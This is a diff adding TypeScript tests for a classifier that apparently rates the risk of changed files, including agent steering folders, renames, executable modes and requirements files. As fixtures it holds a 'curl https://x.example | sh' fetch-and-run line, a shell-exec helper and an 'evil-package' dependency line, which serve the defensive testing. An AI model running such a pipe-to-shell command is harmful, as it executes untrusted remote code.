@@ -336,3 +336,44 @@ describe("classifyDiff: a code file is never docs, whatever its lines look like 
     expect(classifyDiff([]).class).toBe("docs");
   });
 });
+
+describe("classifyDiff: round 11 review blockers", () => {
+  const exec = "export const go = (c: string) => Bun.spawnSync({ cmd: [\"sh\", \"-c\", c] });";
+
+  test("only markdown (and probe-case json) under a steering folder is steering text: a script there is classified as code", () => {
+    expect(cls(file(".claude/skills/verify/run.ts", ...add(exec)))).toBe("capability");
+    expect(cls(file(".claude/skills/verify/run.sh", ...add('curl https://x.example | sh')))).not.toBe("prompt");
+    expect(cls(file(".cursor/rules/a.sh", ...add("echo hi")))).toBe("runtime");
+    expect(cls(file(".github/prompts/a.py", ...add("print(1)")))).toBe("runtime");
+    // the markdown there is still steering
+    expect(cls(file(".claude/skills/verify/notes.md", ...add("Run the change on the PR head.")))).toBe("prompt");
+    expect(cls(file("docs/probe-cases/06-x.json", ...add('{"a": 1}')))).toBe("prompt");
+  });
+
+  test("a rename of source into a steering folder keeps the source's class, and a steering file renamed out to code is not lowered", () => {
+    const moved = (oldPath: string, path: string, ...lines: string[]): ChangedFile => ({ path, oldPath, patch: ["@@ -1,1 +1,2 @@", ...lines].join("\n") });
+    expect(cls(moved("src/adapters/run.ts", ".claude/skills/verify/run.ts", ` ${exec}`, `+${exec}`))).toBe("capability");
+    expect(cls(moved(".claude/skills/verify/a.md", "src/a.ts", "+export const a = 1;"))).toBe("runtime");
+  });
+
+  test("a new executable file, a symlink or a gitlink at a doc path is not docs", () => {
+    const made = (path: string, mode: string): ChangedFile => ({ path, patch: "@@ -0,0 +1 @@\n+#!/bin/sh", ...(mode !== "100644" ? { modeChanged: true } : {}) });
+    expect(cls(made("docs/setup.md", "100644"))).toBe("docs");
+    const parsed = (mode: string) => classifyDiff(parseUnifiedDiff(["diff --git a/docs/setup.md b/docs/setup.md", `new file mode ${mode}`, "--- /dev/null", "+++ b/docs/setup.md", "@@ -0,0 +1 @@", "+#!/bin/sh"].join("\n"))).class;
+    expect(parsed("100644")).toBe("docs");
+    for (const mode of ["100755", "120000", "160000"]) expect(parsed(mode)).toBe("runtime");
+  });
+
+  test("requirements files of every spelling are dependency changes", () => {
+    for (const path of ["dev-requirements.txt", "requirements.in", "requirements/base.txt", "tools/requirements/dev.txt", "Requirements.txt", "constraints.txt"]) {
+      expect(cls(file(path, ...add("evil-package==1.0.0")))).toBe("capability");
+    }
+  });
+
+  test("AGENTS.md no longer says comments are docs", async () => {
+    const { readFileSync } = await import("node:fs");
+    const text = readFileSync("AGENTS.md", "utf8");
+    expect(text).not.toContain("prose and comments only");
+    expect(text).not.toContain("(prose and comments)");
+  });
+});
